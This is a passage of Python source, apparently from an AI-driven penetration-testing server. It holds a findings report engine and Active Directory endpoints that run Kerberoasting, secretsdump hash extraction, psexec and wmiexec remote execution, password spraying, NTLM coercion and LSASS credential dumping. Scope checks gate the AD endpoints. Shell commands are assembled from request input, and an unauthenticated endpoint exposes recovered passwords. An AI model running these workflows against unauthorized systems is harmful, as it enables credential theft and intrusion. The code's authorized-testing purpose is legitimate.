            m = re.search(r'((?:Status:\s*|^\d{3}\s+\w+\s+)(\d{3}).*?)?\s*(/\S+)', line)
            if not m:
                continue
            path   = m.group(3)
            status = ""
            sm = re.search(r'(\d{3})', line)
            if sm:
                status = sm.group(1)

            if not _SENSITIVE.search(path):
                continue

            sev  = "high" if any(kw in path.lower() for kw in [".env", "passwd", "shadow", "credential", ".git", ".aws", ".ssh"]) else "medium"
            cvss = 7.0 if sev == "high" else 4.5

            finding = Finding(
                id=str(uuid.uuid4()),
                title=f"Sensitive Path Discovered: {path}",
                severity=sev,
                cvss_score=cvss,
                target=f"{target}{path}" if target else path,
                tool="gobuster",
                description=f"Sensitive path '{path}' returned HTTP {status or 'unknown'}. May expose configuration, credentials, or source code.",
                evidence=line.strip(),
                remediation="Remove or restrict access to sensitive files/directories. Ensure web server does not serve backup or config files.",
                timestamp=datetime.now().isoformat(),
                tags=["web", "directory-bruteforce", "sensitive-exposure"],
                cve_ids=[]
            )
            self.add_finding(finding)
            count += 1

        return count

    def auto_import_from_sqlmap(self, raw_output: str, target: str = "") -> int:
        """Parse sqlmap output and create high/critical findings for injection points."""
        count = 0
        injection_blocks: List[str] = []
        current_block: List[str] = []
        in_block = False

        for line in raw_output.splitlines():
            if "is vulnerable" in line.lower() or "identified the following injection point" in line.lower():
                in_block = True
                current_block = [line]
            elif in_block:
                current_block.append(line)
                if line.strip() == "" and len(current_block) > 3:
                    injection_blocks.append("\n".join(current_block))
                    current_block = []
                    in_block = False

        # Also catch single-line hits
        for line in raw_output.splitlines():
            if re.search(r'(sql injection|sqli|boolean-based|time-based|union-based|error-based)', line, re.IGNORECASE):
                if line.strip() not in [b for block in injection_blocks for b in block.splitlines()]:
                    injection_blocks.append(line.strip())

        for block in injection_blocks:
            param_m = re.search(r'Parameter:\s*(.+)', block)
            param = param_m.group(1).strip() if param_m else "unknown"
            technique_m = re.search(r'Type:\s*(.+)', block)
            technique = technique_m.group(1).strip() if technique_m else "SQL Injection"

            finding = Finding(
                id=str(uuid.uuid4()),
                title=f"SQL Injection: parameter '{param}'",
                severity="critical",
                cvss_score=9.8,
                target=target or "unknown",
                tool="sqlmap",
                description=f"SQL injection vulnerability detected in parameter '{param}' using {technique} technique.",
                evidence=block[:500],
                remediation="Use parameterized queries / prepared statements. Never concatenate user input into SQL strings.",
                timestamp=datetime.now().isoformat(),
                tags=["web", "sqli", "injection"],
                cve_ids=[]
            )
            self.add_finding(finding)
            count += 1

        return count

    def auto_import_from_hydra(self, raw_output: str, target: str = "") -> int:
        """Parse hydra/medusa output and create critical findings for valid credentials."""
        count = 0
        # hydra: [22][ssh] host: 10.0.0.1   login: admin   password: password123
        # medusa: ACCOUNT FOUND: [ssh] Host: 10.0.0.1 User: admin Password: pass
        patterns = [
            re.compile(r'\[(\d+)\]\[(\w+)\]\s+host:\s+(\S+)\s+login:\s+(\S+)\s+password:\s+(.+)', re.IGNORECASE),
            re.compile(r'ACCOUNT FOUND.*?Host:\s+(\S+)\s+User:\s+(\S+)\s+Password:\s+(.+)', re.IGNORECASE),
            re.compile(r'\[(\w+)\].*?(\S+)\s+(\S+):(\S+)', re.IGNORECASE),
        ]

        for line in raw_output.splitlines():
            for pat in patterns:
                m = pat.search(line)
                if not m:
                    continue
                groups = m.groups()
                if len(groups) >= 4:
                    host = groups[2] if len(groups) > 4 else groups[0]
                    user = groups[3] if len(groups) > 4 else groups[1]
                    pwd  = groups[4] if len(groups) > 4 else groups[2]
                    svc  = groups[1] if len(groups) > 4 else "unknown"
                elif len(groups) == 3:
                    host, user, pwd, svc = groups[0], groups[1], groups[2], "unknown"
                else:
                    continue

                finding = Finding(
                    id=str(uuid.uuid4()),
                    title=f"Valid Credentials: {user}@{host} [{svc}]",
                    severity="critical",
                    cvss_score=9.0,
                    target=target or host,
                    tool="hydra",
                    description=f"Valid credentials found: {user}:{pwd} on {host} via {svc}.",
                    evidence=line.strip(),
                    remediation="Change the compromised password immediately. Enforce strong password policy and MFA.",
                    timestamp=datetime.now().isoformat(),
                    tags=["credentials", "brute-force", svc],
                    cve_ids=[]
                )
                self.add_finding(finding)
                count += 1
                break  # one finding per line

        return count

    # ------------------------------------------------------------------
    # Report generation
    # ------------------------------------------------------------------
    def generate_html(self, output_path: str, engagement_name: str = "") -> str:
        """Render and save HTML report. Returns the output path."""
        if engagement_name:
            self.engagement_name = engagement_name
        stats = self.get_statistics()
        findings_by_sev = self._findings_by_severity()

        if JINJA2_AVAILABLE:
            env = Environment(loader=BaseLoader())
            template = env.from_string(_REPORT_HTML_TEMPLATE)
            html_content = template.render(
                engagement_name=self.engagement_name,
                generated_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                total=stats["total"],
                counts=stats["by_severity"],
                findings_by_sev=findings_by_sev
            )
        else:
            # Minimal fallback without Jinja2
            rows = "".join(
                f"<tr><td>{f.severity}</td><td>{f.title}</td><td>{f.target}</td><td>{f.tool}</td></tr>"
                for f in self.findings
            )
            html_content = f"<html><body><h1>{self.engagement_name}</h1><table border='1'><tr><th>Severity</th><th>Title</th><th>Target</th><th>Tool</th></tr>{rows}</table></body></html>"

        Path(output_path).parent.mkdir(parents=True, exist_ok=True)
        Path(output_path).write_text(html_content, encoding="utf-8")
        logger.info(f"📄 HTML report saved: {output_path}")
        return output_path

    def generate_pdf(self, output_path: str, engagement_name: str = "") -> str:
        """Generate PDF from HTML report using weasyprint."""
        if not WEASYPRINT_AVAILABLE:
            raise RuntimeError("weasyprint is not installed. Run: pip install weasyprint")
        html_path = output_path.replace(".pdf", "_tmp.html")
        self.generate_html(html_path, engagement_name)
        weasyprint.HTML(filename=html_path).write_pdf(output_path)
        try:
            Path(html_path).unlink()
        except Exception:
            pass
        logger.info(f"📄 PDF report saved: {output_path}")
        return output_path

    def export_json(self, output_path: str) -> str:
        """Export all findings as JSON."""
        data = {
            "engagement": self.engagement_name,
            "generated_at": datetime.now().isoformat(),
            "statistics": self.get_statistics(),
            "findings": [f.to_dict() for f in self.findings]
        }
        Path(output_path).write_text(json.dumps(data, indent=2), encoding="utf-8")
        logger.info(f"📄 JSON export saved: {output_path}")
        return output_path

    def export_sarif(self, output_path: str) -> str:
        """
        Export findings as SARIF v2.1.0 (Static Analysis Results Interchange Format).

        Compatible with:
          - GitHub Code Scanning  (upload via gh CLI or Actions)
          - Azure DevOps Security tab
          - VS Code SARIF Viewer extension
          - SonarQube / SonarCloud
          - Any OASIS SARIF-compliant tool

        Severity mapping:
          critical → error
          high     → error
          medium   → warning
          low      → note
          info     → none
        """
        _sev_map = {
            "critical": "error",
            "high":     "error",
            "medium":   "warning",
            "low":      "note",
            "info":     "none"
        }
        _level_map = {
            "critical": "error",
            "high":     "error",
            "medium":   "warning",
            "low":      "note",
            "info":     "none"
        }

        rules: List[Dict] = []
        results: List[Dict] = []
        seen_rule_ids: set = set()

        for finding in self.findings:
            # Build a stable rule ID from title
            rule_id = re.sub(r'[^a-zA-Z0-9_/-]', '-', finding.title)[:64]
            sev_label = finding.severity.lower()
            sarif_level = _level_map.get(sev_label, "warning")

            # Add rule definition (once per unique title)
            if rule_id not in seen_rule_ids:
                seen_rule_ids.add(rule_id)
                rule: Dict[str, Any] = {
                    "id": rule_id,
                    "name": finding.title,
                    "shortDescription": {"text": finding.title},
                    "fullDescription":  {"text": finding.description or finding.title},
                    "defaultConfiguration": {"level": sarif_level},
                    "properties": {
                        "tags":      finding.tags or [],
                        "severity":  sev_label,
                        "cvss":      finding.cvss_score,
                        "tool":      finding.tool
                    }
                }
                if finding.remediation:
                    rule["help"] = {"text": finding.remediation}
                if finding.cve_ids:
                    rule["properties"]["cve"] = finding.cve_ids
                rules.append(rule)

            # Build result entry
            target = finding.target or "unknown"
            result_entry: Dict[str, Any] = {
                "ruleId":  rule_id,
                "level":   sarif_level,
                "message": {
                    "text": (
                        f"{finding.description or finding.title}\n\n"
                        f"Target: {target}\n"
                        f"Tool: {finding.tool}\n"
                        f"CVSS: {finding.cvss_score}"
                    )
                },
                "locations": [{
                    "physicalLocation": {
                        "artifactLocation": {
                            "uri":         target,
                            "uriBaseId":   "%SRCROOT%"
                        },
                        "region": {"startLine": 1}
                    },
                    "logicalLocations": [{
                        "name":              target,
                        "fullyQualifiedName": target,
                        "kind":              "network-host"
                    }]
                }],
                "properties": {
                    "engagement":  self.engagement_name,
                    "finding_id":  finding.id,
                    "timestamp":   finding.timestamp,
                    "severity":    sev_label,
                    "evidence":    finding.evidence or ""
                }
            }
            # Attach CVE references if present
            if finding.cve_ids:
                result_entry["relatedLocations"] = []
                result_entry["suppressions"] = []
                result_entry["taxa"] = [
                    {"id": cve, "toolComponent": {"name": "NVD"}}
                    for cve in finding.cve_ids
                ]
            results.append(result_entry)

        sarif_doc = {
            "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
            "version": "2.1.0",
            "runs": [{
                "tool": {
                    "driver": {
                        "name":            "HexStrike AI",
                        "version":         "7.0.0",
                        "informationUri":  "https://github.com/0x4m4/hexstrike-ai",
                        "organization":    "HexStrike",
                        "shortDescription": {"text": "AI-powered penetration testing platform"},
                        "rules":           rules
                    }
                },
                "results":     results,
                "invocations": [{
                    "executionSuccessful": True,
                    "commandLine":         "hexstrike-ai scan",
                    "startTimeUtc":        datetime.now().isoformat() + "Z"
                }],
                "properties": {
                    "engagement": self.engagement_name,
                    "generated_at": datetime.now().isoformat(),
                    "total_findings": len(self.findings)
                }
            }]
        }

        Path(output_path).parent.mkdir(parents=True, exist_ok=True)
        Path(output_path).write_text(json.dumps(sarif_doc, indent=2), encoding="utf-8")
        logger.info(f"📄 SARIF export saved: {output_path} ({len(results)} results, {len(rules)} rules)")
        return output_path


# Global report engine instance
report_engine = HexStrikeReportEngine()

# ------------------------------------------------------------------
# Reports API Endpoints
# ------------------------------------------------------------------

@app.route("/api/reports/add-finding", methods=["POST"])
@require_api_key
def reports_add_finding():
    """Add a finding to the active report."""
    try:
        params = request.json or {}
        if not params.get("title"):
            return jsonify({"error": "title is required"}), 400
        finding = Finding.from_dict(params)
        report_engine.add_finding(finding)
        return jsonify({"success": True, "finding_id": finding.id, "timestamp": datetime.now().isoformat()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/reports/list-findings", methods=["GET"])
def reports_list_findings():
    """List all findings in the active report."""
    try:
        findings = [f.to_dict() for f in report_engine.findings]
        return jsonify({"success": True, "findings": findings, "total": len(findings), "timestamp": datetime.now().isoformat()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/reports/clear-findings", methods=["DELETE", "POST"])
@require_api_key
def reports_clear_findings():
    """Clear all findings from the active report."""
    try:
        report_engine.clear_findings()
        return jsonify({"success": True, "message": "All findings cleared", "timestamp": datetime.now().isoformat()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/reports/generate-html", methods=["POST"])
@require_api_key
def reports_generate_html():
    """Generate HTML report from current findings."""
    try:
        params = request.json or {}
        output_path = sanitize_input(params.get("output_path", f"/tmp/hexstrike_report_{int(time.time())}.html"))
        engagement_name = sanitize_input(params.get("engagement_name", "HexStrike Engagement"))
        path = report_engine.generate_html(output_path, engagement_name)
        stats = report_engine.get_statistics()
        return jsonify({"success": True, "output_path": path, "statistics": stats, "timestamp": datetime.now().isoformat()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/reports/generate-pdf", methods=["POST"])
@require_api_key
def reports_generate_pdf():
    """Generate PDF report from current findings (requires weasyprint)."""
    try:
        if not WEASYPRINT_AVAILABLE:
            return jsonify({"error": "weasyprint not installed. Run: pip install weasyprint", "success": False}), 501
        params = request.json or {}
        output_path = sanitize_input(params.get("output_path", f"/tmp/hexstrike_report_{int(time.time())}.pdf"))
        engagement_name = sanitize_input(params.get("engagement_name", "HexStrike Engagement"))
        path = report_engine.generate_pdf(output_path, engagement_name)
        stats = report_engine.get_statistics()
        return jsonify({"success": True, "output_path": path, "statistics": stats, "timestamp": datetime.now().isoformat()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/reports/statistics", methods=["GET"])
def reports_statistics():
    """Get statistics about current findings."""
    try:
        return jsonify({"success": True, **report_engine.get_statistics(), "timestamp": datetime.now().isoformat()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/reports/export-json", methods=["POST"])
@require_api_key
def reports_export_json():
    """Export all findings as JSON."""
    try:
        params = request.json or {}
        output_path = sanitize_input(params.get("output_path", f"/tmp/hexstrike_findings_{int(time.time())}.json"))
        path = report_engine.export_json(output_path)
        return jsonify({"success": True, "output_path": path, "timestamp": datetime.now().isoformat()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/reports/export-sarif", methods=["POST"])
@require_api_key
def reports_export_sarif():
    """
    Export findings as SARIF v2.1.0 for GitHub Code Scanning, Azure DevOps, VS Code, etc.

    Upload to GitHub:
      gh code-scanning upload-results --ref refs/heads/main --commit <sha> --sarif /tmp/findings.sarif

    View in VS Code:
      Install 'SARIF Viewer' extension → open .sarif file directly
    """
    try:
        params = request.json or {}
        output_path = sanitize_input(
            params.get("output_path", f"/tmp/hexstrike_{int(time.time())}.sarif")
        )
        path = report_engine.export_sarif(output_path)
        stats = report_engine.get_statistics()
        return jsonify({
            "success":       True,
            "output_path":   path,
            "findings_count": stats["total"],
            "rules_count":   len(set(f.title for f in report_engine.findings)),
            "github_upload_hint": (
                f"gh code-scanning upload-results "
                f"--ref refs/heads/main --commit $(git rev-parse HEAD) --sarif {path}"
            ),
            "timestamp": datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({"error": str(e), "success": False}), 500


@app.route("/api/reports/auto-import", methods=["POST"])
@require_api_key
def reports_auto_import():
    """
    Auto-import findings from tool output into the active engagement.

    Supported tools:
      nuclei   — JSON lines format (-json flag)
      nmap     — standard text output (flags risky services + NSE vulns)
      nikto    — text or CSV output
      gobuster — dir/file output (flags sensitive paths)
      feroxbuster — same parser as gobuster
      sqlmap   — flags injection points as critical
      hydra    — flags valid credentials as critical
      medusa   — same parser as hydra
    """
    try:
        params = request.json or {}
        tool_name = params.get("tool_name", "nuclei").lower()
        tool_output = params.get("tool_output", "")
        target = sanitize_input(params.get("target", ""))

        if not tool_output:
            return jsonify({"error": "tool_output is required"}), 400

        _SUPPORTED = {
            "nuclei":       lambda: report_engine.auto_import_from_nuclei(tool_output),
            "nmap":         lambda: report_engine.auto_import_from_nmap(tool_output, target),
            "nikto":        lambda: report_engine.auto_import_from_nikto(tool_output, target),
            "gobuster":     lambda: report_engine.auto_import_from_gobuster(tool_output, target),
            "feroxbuster":  lambda: report_engine.auto_import_from_gobuster(tool_output, target),
            "sqlmap":       lambda: report_engine.auto_import_from_sqlmap(tool_output, target),
            "hydra":        lambda: report_engine.auto_import_from_hydra(tool_output, target),
            "medusa":       lambda: report_engine.auto_import_from_hydra(tool_output, target),
        }

        if tool_name not in _SUPPORTED:
            return jsonify({
                "error": f"Auto-import not supported for '{tool_name}'.",
                "supported_tools": list(_SUPPORTED.keys())
            }), 400

        count = _SUPPORTED[tool_name]()
        return jsonify({
            "success": True,
            "tool": tool_name,
            "imported": count,
            "total_findings": len(report_engine.findings),
            "timestamp": datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ------------------------------------------------------------------
# Engagement management endpoints
# ------------------------------------------------------------------

@app.route("/api/reports/set-engagement", methods=["POST"])
@require_api_key
def reports_set_engagement():
    """Switch to a named engagement (creates it if new, loads existing findings if it exists)."""
    try:
        params = request.json or {}
        name = sanitize_input(params.get("name", ""))
        if not name:
            return jsonify({"error": "name is required"}), 400
        report_engine.set_engagement(name)
        stats = report_engine.get_statistics()
        return jsonify({
            "success": True,
            "engagement": name,
            "loaded_findings": stats["total"],
            "statistics": stats,
            "db_path": str(HexStrikeReportEngine.DB_PATH),
            "timestamp": datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/reports/list-engagements", methods=["GET"])
def reports_list_engagements():
    """List all engagements stored in the DB with finding counts."""
    try:
        engagements = report_engine.list_engagements()
        return jsonify({
            "success": True,
            "active_engagement": report_engine.engagement_name,
            "engagements": engagements,
            "db_path": str(HexStrikeReportEngine.DB_PATH),
            "timestamp": datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/reports/delete-engagement", methods=["DELETE", "POST"])
@require_api_key
def reports_delete_engagement():
    """Permanently delete an engagement and all its findings from the DB."""
    try:
        params = request.json or {}
        name = sanitize_input(params.get("name", ""))
        if not name:
            return jsonify({"error": "name is required"}), 400
        ok = report_engine.delete_engagement(name)
        return jsonify({"success": ok, "deleted": name, "timestamp": datetime.now().isoformat()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ============================================================================
# ACTIVE DIRECTORY MODULE (v7.0)
# ============================================================================

class ADWorkflowManager:
    """Manages Active Directory attack workflows for authorized engagements."""

    @staticmethod
    def build_impacket_creds(username: str, password: str, domain: str, hashes: str = "") -> str:
        """Build impacket credential string."""
        if hashes:
            return f"{domain}/{username}:{hashes}"
        return f"{domain}/{username}:{password}"

    def kerberoasting_workflow(self, domain: str, dc_ip: str, username: str, password: str, output_dir: str = "/tmp") -> Dict[str, Any]:
        """Full Kerberoasting: enum SPNs → request TGS → save for cracking."""
        results = {}
        spn_file = f"{output_dir}/spns_{int(time.time())}.txt"
        # Step 1: Get SPN accounts with impacket
        cmd1 = f"impacket-GetUserSPNs {domain}/{username}:{password} -dc-ip {dc_ip} -outputfile {spn_file}"
        results["get_spns"] = execute_command(cmd1, use_cache=False)
        # Step 2: If hashcat wordlist available, suggest crack command
        results["crack_suggestion"] = f"hashcat -m 13100 {spn_file} /usr/share/wordlists/rockyou.txt"
        results["workflow"] = "kerberoasting"
        results["domain"] = domain
        return results

    def asreproasting_workflow(self, domain: str, dc_ip: str, output_dir: str = "/tmp") -> Dict[str, Any]:
        """AS-REP Roasting: find pre-auth disabled accounts → request AS-REP hashes."""
        results = {}
        hash_file = f"{output_dir}/asrep_{int(time.time())}.txt"
        cmd = f"impacket-GetNPUsers {domain}/ -dc-ip {dc_ip} -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -outputfile {hash_file}"
        results["get_np_users"] = execute_command(cmd, use_cache=False)
        results["crack_suggestion"] = f"hashcat -m 18200 {hash_file} /usr/share/wordlists/rockyou.txt"
        results["workflow"] = "asreproasting"
        return results

    def domain_enum_workflow(self, domain: str, dc_ip: str, username: str, password: str, output_dir: str = "/tmp") -> Dict[str, Any]:
        """Full domain enumeration: ldapdomaindump + bloodhound collector."""
        results = {}
        ldap_out = f"{output_dir}/ldap_dump_{int(time.time())}"
        cmd_ldap = f"ldapdomaindump {dc_ip} -u '{domain}\\{username}' -p '{password}' -o {ldap_out}"
        results["ldap_dump"] = execute_command(cmd_ldap, use_cache=False)
        cmd_bh = f"bloodhound-python -d {domain} -u {username} -p {password} -ns {dc_ip} -c All --zip -o {output_dir}"
        results["bloodhound_collect"] = execute_command(cmd_bh, use_cache=False)
        results["workflow"] = "domain_enum"
        return results

    def certificate_abuse_workflow(self, domain: str, dc_ip: str, username: str, password: str, ca: str = "") -> Dict[str, Any]:
        """AD CS abuse: find templates → check ESC misconfigs → attempt exploitation."""
        results = {}
        cmd_find = f"certipy find -u {username}@{domain} -p {password} -dc-ip {dc_ip} -stdout"
        results["find_templates"] = execute_command(cmd_find, use_cache=False)
        if ca:
            cmd_req = f"certipy req -u {username}@{domain} -p {password} -dc-ip {dc_ip} -ca '{ca}' -template 'User'"
            results["request_cert"] = execute_command(cmd_req, use_cache=False)
        results["workflow"] = "certificate_abuse"
        return results


ad_workflow_manager = ADWorkflowManager()

# ------------------------------------------------------------------
# Active Directory Tool Endpoints
# ------------------------------------------------------------------

@app.route("/api/tools/bloodhound-python", methods=["POST"])
@require_api_key
def bloodhound_python_scan():
    """BloodHound Python collector — maps AD attack paths."""
    try:
        params = request.json or {}
        domain = sanitize_input(params.get("domain", ""))
        username = sanitize_input(params.get("username", ""))
        password = sanitize_input(params.get("password", ""))
        dc_ip = sanitize_input(params.get("dc_ip", ""))
        collection_method = sanitize_input(params.get("collection_method", "All"))
        output_dir = sanitize_input(params.get("output_dir", "/tmp/bloodhound"))
        additional_args = sanitize_input(params.get("additional_args", ""))
        scope_manager.validate_or_raise(dc_ip or domain)
        Path(output_dir).mkdir(parents=True, exist_ok=True)
        cmd = f"bloodhound-python -d {domain} -u {username} -p {password} -ns {dc_ip} -c {collection_method} --zip -o {output_dir} {additional_args}".strip()
        logger.info(f"🩸 BloodHound collection: {domain}")
        result = execute_command_with_recovery("bloodhound-python", cmd, params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/impacket-secretsdump", methods=["POST"])
@require_api_key
def impacket_secretsdump():
    """Impacket secretsdump — remote hash extraction (NTDS, SAM, LSA)."""
    try:
        params = request.json or {}
        target = sanitize_input(params.get("target", ""))
        username = sanitize_input(params.get("username", ""))
        password = sanitize_input(params.get("password", ""))
        domain = sanitize_input(params.get("domain", ""))
        hashes = sanitize_input(params.get("hashes", ""))
        additional_args = sanitize_input(params.get("additional_args", ""))
        scope_manager.validate_or_raise(target)
        creds = f"{domain}/{username}:{password}" if not hashes else f"{domain}/{username}:{hashes}"
        cmd = f"impacket-secretsdump {creds}@{target} {additional_args}".strip()
        logger.info(f"🔑 Secretsdump: {target}")
        result = execute_command_with_recovery("impacket-secretsdump", cmd, params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/impacket-psexec", methods=["POST"])
@require_api_key
def impacket_psexec():
    """Impacket psexec — remote command execution via SMB."""
    try:
        params = request.json or {}
        target = sanitize_input(params.get("target", ""))
        username = sanitize_input(params.get("username", ""))
        password = sanitize_input(params.get("password", ""))
        domain = sanitize_input(params.get("domain", ""))
        command = sanitize_input(params.get("command", "whoami"))
        additional_args = sanitize_input(params.get("additional_args", ""))
        scope_manager.validate_or_raise(target)
        creds = f"{domain}/{username}:{password}"
        cmd = f"impacket-psexec {creds}@{target} '{command}' {additional_args}".strip()
        logger.info(f"💻 PsExec: {target}")
        result = execute_command_with_recovery("impacket-psexec", cmd, params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/impacket-wmiexec", methods=["POST"])
@require_api_key
def impacket_wmiexec():
    """Impacket wmiexec — WMI-based remote execution."""
    try:
        params = request.json or {}
        target = sanitize_input(params.get("target", ""))
        username = sanitize_input(params.get("username", ""))
        password = sanitize_input(params.get("password", ""))
        domain = sanitize_input(params.get("domain", ""))
        command = sanitize_input(params.get("command", "whoami"))
        additional_args = sanitize_input(params.get("additional_args", ""))
        scope_manager.validate_or_raise(target)
        creds = f"{domain}/{username}:{password}"
        cmd = f"impacket-wmiexec {creds}@{target} '{command}' {additional_args}".strip()
        logger.info(f"🖥️  WMIExec: {target}")
        result = execute_command_with_recovery("impacket-wmiexec", cmd, params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/kerbrute", methods=["POST"])
@require_api_key
def kerbrute_scan():
    """Kerbrute — Kerberos user enumeration and password spraying."""
    try:
        params = request.json or {}
        dc_ip = sanitize_input(params.get("dc_ip", ""))
        domain = sanitize_input(params.get("domain", ""))
        wordlist = sanitize_input(params.get("wordlist", "/usr/share/seclists/Usernames/Names/names.txt"))
        mode = sanitize_input(params.get("mode", "userenum"))  # userenum / passwordspray / bruteuser
        password = sanitize_input(params.get("password", ""))
        additional_args = sanitize_input(params.get("additional_args", ""))
        scope_manager.validate_or_raise(dc_ip or domain)
        if mode == "userenum":
            cmd = f"kerbrute userenum --dc {dc_ip} -d {domain} {wordlist} {additional_args}"
        elif mode == "passwordspray":
            cmd = f"kerbrute passwordspray --dc {dc_ip} -d {domain} {wordlist} {password} {additional_args}"
        else:
            cmd = f"kerbrute bruteuser --dc {dc_ip} -d {domain} {wordlist} {additional_args}"
        logger.info(f"🎟️  Kerbrute [{mode}]: {domain}")
        result = execute_command_with_recovery("kerbrute", cmd.strip(), params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/certipy", methods=["POST"])
@require_api_key
def certipy_scan():
    """Certipy — AD Certificate Services attack tool (ESC1-ESC13)."""
    try:
        params = request.json or {}
        action = sanitize_input(params.get("action", "find"))  # find/req/auth/shadow/relay
        target = sanitize_input(params.get("target", ""))
        username = sanitize_input(params.get("username", ""))
        password = sanitize_input(params.get("password", ""))
        domain = sanitize_input(params.get("domain", ""))
        ca = sanitize_input(params.get("ca", ""))
        dc_ip = sanitize_input(params.get("dc_ip", ""))
        additional_args = sanitize_input(params.get("additional_args", ""))
        scope_manager.validate_or_raise(target or dc_ip or domain)
        base = f"certipy {action} -u {username}@{domain} -p {password}"
        if dc_ip:
            base += f" -dc-ip {dc_ip}"
        if ca and action in ("req", "auth"):
            base += f" -ca '{ca}'"
        cmd = f"{base} {additional_args}".strip()
        logger.info(f"📜 Certipy [{action}]: {domain}")
        result = execute_command_with_recovery("certipy", cmd, params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/ldapdomaindump", methods=["POST"])
@require_api_key
def ldapdomaindump_scan():
    """LdapDomainDump — Active Directory enumeration via LDAP."""
    try:
        params = request.json or {}
        dc_ip = sanitize_input(params.get("dc_ip", ""))
        domain = sanitize_input(params.get("domain", ""))
        username = sanitize_input(params.get("username", ""))
        password = sanitize_input(params.get("password", ""))
        output_dir = sanitize_input(params.get("output_dir", "/tmp/ldap_dump"))
        additional_args = sanitize_input(params.get("additional_args", ""))
        scope_manager.validate_or_raise(dc_ip or domain)
        Path(output_dir).mkdir(parents=True, exist_ok=True)
        cmd = f"ldapdomaindump {dc_ip} -u '{domain}\\{username}' -p '{password}' -o {output_dir} {additional_args}".strip()
        logger.info(f"📂 LdapDomainDump: {dc_ip}")
        result = execute_command_with_recovery("ldapdomaindump", cmd, params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/coercer", methods=["POST"])
@require_api_key
def coercer_scan():
    """Coercer — Force NTLM authentication (PetitPotam, PrinterBug, etc.)."""
    try:
        params = request.json or {}
        target = sanitize_input(params.get("target", ""))
        listener_ip = sanitize_input(params.get("listener_ip", ""))
        username = sanitize_input(params.get("username", ""))
        password = sanitize_input(params.get("password", ""))
        domain = sanitize_input(params.get("domain", ""))
        additional_args = sanitize_input(params.get("additional_args", ""))
        scope_manager.validate_or_raise(target)
        cmd = f"coercer coerce -t {target} -l {listener_ip} -u {username} -p {password} -d {domain} {additional_args}".strip()
        logger.info(f"🪝 Coercer: {target} → listener {listener_ip}")
        result = execute_command_with_recovery("coercer", cmd, params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/lsassy", methods=["POST"])
@require_api_key
def lsassy_scan():
    """Lsassy — Remote LSASS dump and credential extraction."""
    try:
        params = request.json or {}
        target = sanitize_input(params.get("target", ""))
        username = sanitize_input(params.get("username", ""))
        password = sanitize_input(params.get("password", ""))
        domain = sanitize_input(params.get("domain", ""))
        method = sanitize_input(params.get("method", "comsvcs"))
        additional_args = sanitize_input(params.get("additional_args", ""))
        scope_manager.validate_or_raise(target)
        cmd = f"lsassy -u {username} -p {password} -d {domain} -m {method} {target} {additional_args}".strip()
        logger.info(f"🔐 Lsassy [{method}]: {target}")
        result = execute_command_with_recovery("lsassy", cmd, params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# AD Workflow Endpoints
@app.route("/api/ad/kerberoasting-workflow", methods=["POST"])
@require_api_key
def ad_kerberoasting_workflow():
    """Full Kerberoasting workflow: enum SPNs → request TGS tickets → crack suggestions."""
    try:
        params = request.json or {}
        domain = sanitize_input(params.get("domain", ""))
        dc_ip = sanitize_input(params.get("dc_ip", ""))
        username = sanitize_input(params.get("username", ""))
        password = sanitize_input(params.get("password", ""))
        output_dir = sanitize_input(params.get("output_dir", "/tmp"))
        scope_manager.validate_or_raise(dc_ip or domain)
        results = ad_workflow_manager.kerberoasting_workflow(domain, dc_ip, username, password, output_dir)
        return jsonify({"success": True, **results, "timestamp": datetime.now().isoformat()})
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/ad/asreproasting-workflow", methods=["POST"])
@require_api_key
def ad_asreproasting_workflow():
    """AS-REP Roasting workflow: find pre-auth disabled accounts → capture hashes."""
    try:
        params = request.json or {}
        domain = sanitize_input(params.get("domain", ""))
        dc_ip = sanitize_input(params.get("dc_ip", ""))
        output_dir = sanitize_input(params.get("output_dir", "/tmp"))
